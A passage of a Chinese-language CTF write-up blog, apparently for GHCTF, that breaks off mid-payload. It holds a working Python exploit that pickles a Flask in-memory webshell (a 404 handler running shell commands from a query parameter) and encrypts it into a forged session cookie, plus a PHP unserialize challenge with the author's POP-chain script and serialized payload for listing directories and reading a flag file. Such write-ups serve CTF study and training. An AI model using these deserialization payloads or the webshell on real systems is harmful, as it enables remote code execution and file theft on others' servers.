<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n将此值设置为session cookie，然后访问网站根路径"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>用生成的session访问后再次用admin的session访问fake_flag.txt即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/9d401ee18cb58d0b66eba9dfcc43f6fa.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/d599fbaed9cf9974b7df89170c2be881.png"></p>
<p>用内存马<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13976?time__1311=eqUxuDcDgGYDq2xBkFDnDm2g8FDtqObq4D&amp;u_atoken=20a9bdcfd11fe33d2ee4eb0cdf43dd3e&amp;u_asig=1a0c399817420055481496984e0040">文章 - 新版Flask框架下用钩子函数实现内存马的方式 - 先知社区</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> pickle
<span class="token keyword">import</span> base64
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives<span class="token punctuation">.</span>ciphers <span class="token keyword">import</span> Cipher<span class="token punctuation">,</span> algorithms<span class="token punctuation">,</span> modes
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> padding

key <span class="token operator">=</span> <span class="token string">b'ajwdopldwjdowpajdmslkmwjrfhgnbbv'</span>
iv <span class="token operator">=</span> <span class="token string">b'asdwdggiouewhgpw'</span>


<span class="token comment"># 生成恶意Payload</span>
<span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('shell')).read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#随便访问一个不存在的界面造成404，再往shell里rce</span>

<span class="token comment"># AES 加密和解密函数（⼀个函数处理加密和解密）</span>
<span class="token keyword">def</span> <span class="token function">aes_encrypt_decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'encrypt'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 创建加密器/解密器</span>
    cipher <span class="token operator">=</span> Cipher<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> modes<span class="token punctuation">.</span>CBC<span class="token punctuation">(</span>iv<span class="token punctuation">)</span><span class="token punctuation">,</span> backend<span class="token operator">=</span>default_backend<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">'encrypt'</span><span class="token punctuation">:</span>
        encryptor <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment"># 数据填充，确保数据的⻓度是AES块⼤⼩的倍数</span>
        padder <span class="token operator">=</span> padding<span class="token punctuation">.</span>PKCS7<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span><span class="token punctuation">.</span>padder<span class="token punctuation">(</span><span class="token punctuation">)</span>
        padded_data <span class="token operator">=</span> padder<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> padder<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
        result <span class="token operator">=</span> encryptor<span class="token punctuation">.</span>update<span class="token punctuation">(</span>padded_data<span class="token punctuation">)</span> <span class="token operator">+</span> encryptor<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 返回加密后的数据（Base64编码）</span>
    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token string">'decrypt'</span><span class="token punctuation">:</span>
        decryptor <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment"># 解密数据</span>
        encrypted_data_bytes <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        decrypted_data <span class="token operator">=</span> decryptor<span class="token punctuation">.</span>update<span class="token punctuation">(</span>encrypted_data_bytes<span class="token punctuation">)</span> <span class="token operator">+</span> decryptor<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment"># 去除填充</span>
        unpadder <span class="token operator">=</span> padding<span class="token punctuation">.</span>PKCS7<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span><span class="token punctuation">.</span>unpadder<span class="token punctuation">(</span><span class="token punctuation">)</span>
        unpadded_data <span class="token operator">=</span> unpadder<span class="token punctuation">.</span>update<span class="token punctuation">(</span>decrypted_data<span class="token punctuation">)</span> <span class="token operator">+</span> unpadder<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> unpadded_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>


e <span class="token operator">=</span> Exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
pickled <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
pickled_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickled<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
session <span class="token operator">=</span> aes_encrypt_decrypt<span class="token punctuation">(</span>pickled_data<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'encrypt'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"session="</span><span class="token punctuation">,</span> session<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<hr>
<h3 id="Popppppp-2"><a href="#Popppppp-2" class="headerlink" title="Popppppp(2)"></a>Popppppp(2)</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">CherryBlossom</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$fruit1</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$fruit2</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$newFunc</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit2</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$newFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Forbidden</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$fruit3</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit3</span> <span class="token operator">=</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token variable">$name</span><span class="token punctuation">;</span>
        <span class="token variable">$var</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Warlord</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$fruit4</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$fruit5</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$arg1</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit4</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit5</span><span class="token operator">-&gt;</span><span class="token function">ll2</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'b2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Samurai</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$fruit6</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$fruit7</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$long</span> <span class="token operator">=</span> @<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit6</span><span class="token operator">-&gt;</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$long</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit7</span><span class="token operator">-&gt;</span><span class="token property">tt2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"xxx are the best!!!"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Mystery</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">#__get($property)	当访问一个对象的不存在或不可访问的属性时自动调用，传递属性名作为参数。</span>
        <span class="token function">array_walk</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$day1</span><span class="token punctuation">,</span> <span class="token variable">$day2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">#array_walk($this, ...) 会遍历当前对象的所有公共属性：PHP 会将对象的公共属性转换为数组形式（键名是属性名，值是属性值）。假设对象有属性name =&gt; "John"，则执行 new name("John")。</span>
            <span class="token variable">$day3</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$day2</span><span class="token punctuation">(</span><span class="token variable">$day1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$day3</span> <span class="token keyword">as</span> <span class="token variable">$day4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$day4</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Princess</span> <span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$fruit9</span><span class="token punctuation">;</span>

    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">addMe</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string double-quoted-string">"The time spent with xxx is my happiest time"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit9</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$func</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"Me"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Philosopher</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$fruit10</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$fruit11</span><span class="token operator">=</span><span class="token string double-quoted-string">"sr22kaDugamdwTPhG5zU"</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">#__invoke()	当将一个对象作为函数进行调用时自动调用。</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit11</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">666</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit10</span><span class="token operator">-&gt;</span><span class="token property">hey</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">UselessTwo</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$hiddenVar</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"123123"</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">hiddenVar</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">hiddenVar</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Warrior</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$fruit12</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$fruit13</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit13</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"xxx"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">UselessThree</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$dummyVar</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">UselessFour</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$lalala</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hehe"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'GHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'GHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cjdgg/article/details/115314651">https://blog.csdn.net/cjdgg/article/details/115314651</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/cd1a5c032745f7599a22cc7988cd0085.png"></p>
<p>不能说毫不相关，只能说一模一样，<del>还是见识少了（</del></p>
<p>当时已经将_get前的推出了，但想的是Forbidden传system却又找不到传参的地方。。。</p>
<p>DirectoryIterator 类<br>FilesystemIterator 类,这俩用<code>glob:///*</code>，用<code>/</code>也行<br>GlobIterator 类各不同吧，但GlobIterator自带glob，用<code>/*</code></p>
<p>SplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php
<span class="token comment">#CherryBlossom.__destruct()-&gt;CherryBlossom.__toString()-&gt;Philosopher.__invoke()-&gt;Mystery.__get</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">CherryBlossom</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$fruit1</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$fruit2</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>


<span class="token keyword">class</span> <span class="token class-name-definition class-name">Mystery</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$FilesystemIterator</span><span class="token operator">=</span><span class="token string single-quoted-string">'glob:///*'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>



<span class="token keyword">class</span> <span class="token class-name-definition class-name">Philosopher</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$fruit10</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$fruit11</span><span class="token operator">=</span><span class="token number">213</span><span class="token punctuation">;</span><span class="token comment">#另外我发现这里加不加引号都行，看来'=='是这样的（</span>

<span class="token punctuation">}</span>

<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CherryBlossom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CherryBlossom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span><span class="token operator">-&gt;</span><span class="token property">fruit2</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Philosopher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span><span class="token operator">-&gt;</span><span class="token property">fruit2</span><span class="token operator">-&gt;</span><span class="token property">fruit10</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Mystery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#fruit10而不是11</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">#感觉wp里的pop链写法很简单易懂啊，建议大家都这么写（</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token variable">$SplFileObject</span><span class="token operator">=</span><span class="token string single-quoted-string">'/flag44545615441084'</span><span class="token punctuation">;</span>`

<span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"CherryBlossom"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"fruit1"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"CherryBlossom"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"fruit1"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"fruit2"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Philosopher"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"fruit10"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Mystery"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"SplFileObject"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">19</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"/flag44545615441084"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"fruit11"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">213</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"fruit2"</span><span class="token punctuation">;</span><span class="token 